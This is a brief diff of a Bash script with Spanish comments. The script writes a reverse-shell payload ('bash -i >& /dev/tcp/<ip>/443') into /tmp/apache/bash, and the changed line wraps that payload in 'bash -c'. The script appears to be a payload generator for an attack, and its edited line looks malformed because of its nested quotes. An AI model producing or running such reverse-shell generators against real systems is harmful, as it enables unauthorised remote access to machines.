@@ -14,7 +14,7 @@ fi
 # Generar el archivo de script Bash con la línea de código y la IP proporcionada
 script_file="/tmp/apache/bash"
 echo '#!/bin/bash' > "$script_file"
-echo 'bash -i >& /dev/tcp/'"$ip"'/443 0>&1' >> "$script_file"
+echo 'bash -c 'bash -i >& /dev/tcp/'"$ip"'/443 0>&1' >> "$script_file"
 
 echo "Archivo generado en $script_file"
 
